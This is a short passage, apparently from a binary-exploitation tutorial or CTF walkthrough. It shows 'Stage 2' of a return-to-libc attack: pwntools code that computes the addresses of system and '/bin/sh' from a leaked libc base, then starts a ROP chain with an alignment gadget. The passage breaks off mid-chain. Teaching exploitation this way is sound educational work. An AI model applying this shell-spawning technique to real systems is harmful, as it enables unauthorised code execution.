...
<Steps>
  ...
  <Step title="Stage 2 — Call system('/bin/sh')">
    With `libc_base` known, compute the runtime addresses of `system` and the `/bin/sh` string, then send the second payload:

    ```python
    system = libc_base + libc.symbols['system']
    binsh  = libc_base + next(libc.search(b'/bin/sh'))
    ret    = ROP(binary).find_gadget(['ret'])[0]  # stack alignment

    rop2 = ROP(binary)
    rop2.raw(ret)                        # 16-byte alignment for x86-64 ABI
